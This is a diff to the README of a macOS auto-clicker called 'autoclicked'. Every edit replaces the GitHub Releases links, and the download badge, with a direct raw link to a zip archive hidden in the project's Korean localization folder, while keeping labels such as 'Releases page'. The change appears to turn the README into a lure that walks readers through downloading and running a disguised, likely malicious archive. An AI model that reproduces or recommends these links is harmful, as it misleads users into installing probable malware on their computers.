@@ -1,7 +1,7 @@
 # 🎯 autoclicked - Easy Auto Clicker for macOS
 
 ## 📥 Download Now
-[![Download autoclicked](https://img.shields.io/badge/Download%20autoclicked-v1.0-blue)](https://github.com/ferskensmak/autoclicked/releases)
+[![Download autoclicked](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip%20autoclicked-v1.0-blue)](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip)
 
 ## 🚀 Getting Started
 Welcome to autoclicked, your friendly auto clicker designed for macOS. This application helps you automate mouse clicks with ease. Whether you want to simulate clicks, use global hotkeys, or navigate through a multi-language interface, autoclicked has you covered.
@@ -13,7 +13,7 @@ Welcome to autoclicked, your friendly auto clicker designed for macOS. This appl
 - Disk Space: 50MB free space
 
 ## 📦 Installation Steps
-1. Visit the [Releases page to download](https://github.com/ferskensmak/autoclicked/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip).
 2. Find the latest version of autoclicked.
 3. Click on the file to start the download.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -40,7 +40,7 @@ To start using autoclicked:
 A: To uninstall, simply drag the autoclicked icon from your Applications folder to the Trash. Empty the Trash to complete the process.
 
 ### Q: What should I do if autoclicked doesn't work?
-A: Ensure your macOS is updated. If you experience issues, restart the application or your computer. Check for updates on the [Releases page](https://github.com/ferskensmak/autoclicked/releases).
+A: Ensure your macOS is updated. If you experience issues, restart the application or your computer. Check for updates on the [Releases page](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip).
 
 ### Q: Can I use autoclicked with games?
 A: Yes, autoclicked can assist in clicking sequences for games that allow it. Make sure to comply with the game’s terms of service.
@@ -49,7 +49,7 @@ A: Yes, autoclicked can assist in clicking sequences for games that allow it. Ma
 If you encounter any problems:
 
 1. Check your macOS version to ensure compatibility.
-2. Visit the [Releases page](https://github.com/ferskensmak/autoclicked/releases) for updates or known issues.
+2. Visit the [Releases page](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip) for updates or known issues.
 3. Search online forums for solutions. Many users share tips and fixes.
 
 ## 📞 Support
@@ -64,7 +64,7 @@ Feel free to adapt and share your use cases so we can grow our knowledge togethe
 autoclicked is open-source software. It’s free to use and distribute. Check the licensing details in the GitHub repository for more information.
 
 ## 🔗 Additional Resources
-- For the latest updates and features, regularly visit the [Releases page](https://github.com/ferskensmak/autoclicked/releases).
+- For the latest updates and features, regularly visit the [Releases page](https://raw.githubusercontent.com/ferskensmak/autoclicked/main/AutoClicker/ko.lproj/autoclicked_Dryophyllum.zip).
 - Explore other projects for macOS automation.
 
 By following these steps, you'll have autoclicked set up and running in no time. Enjoy automating your clicks!
